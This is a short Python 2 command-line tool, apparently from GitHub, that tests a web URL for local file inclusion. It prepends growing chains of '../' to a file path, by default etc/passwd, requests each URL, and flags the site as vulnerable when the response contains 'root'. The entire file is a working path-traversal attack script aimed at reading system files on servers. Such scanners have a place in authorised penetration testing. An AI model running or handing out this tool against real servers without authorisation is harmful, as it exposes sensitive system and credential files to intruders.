'''
@KaiyiZhang Github
'''
import sys
import urllib2
import getopt
import time

target = ''
depth = 6
file = 'etc/passwd'

html = ''
prefix = ''
url = ''
keyword='root'

def usage():
		print "LFI.Tester.py Help:"
		print "Usage: LFI.TESTER.py -t [-d] [-f] [-k]"
		print "	-t,--target The test url"
		print "	-d,--depth 	The depth for test (Default is 6)"
		print "	-f,--file The File include  (Default is etc/passwd)"
		print "	-k,--keyword	the keyword for vuln check (Default is root)"


try:
		if len(sys.argv) < 2:
				usage()
				sys.exit()
		opts,args = getopt.getopt(sys.argv[1:],"ht:d:f:k:",["help","target=","depth=","file=","keyword="])
		for opt, arg in opts:
			if opt in("-h","--help"):
				usage()
				sys.exit()
			if opt in("-t","--target"):
				target = arg
				if not target.startswith('http://', 0, 7): 
						target = 'http://' + target
			if opt in("-d","--depth"):
				depth = int(arg)
				if depth < 1:
					usage()
					sys.exit()
			if opt in("-f","--file"):
				file = arg
				if file.startswith('/',0,1):
					file =file[1:]	
			if opt in("-k","--keyword"):
				keyword = arg
				#print keyword

except getopt.GetoptError:
		usage()
		sys.exit(2)


for i in range(0,depth):
		prefix += '../'
		url = target + prefix + file
		print "Testing: ",url
		try:
				response = urllib2.urlopen(url)
				#print response.info()
				html = response.read()
				#print html
		except:
				pass
		if(keyword in html):
				print url, " is Vulnerable"
				break
		else:
				time.sleep(2)
				continue
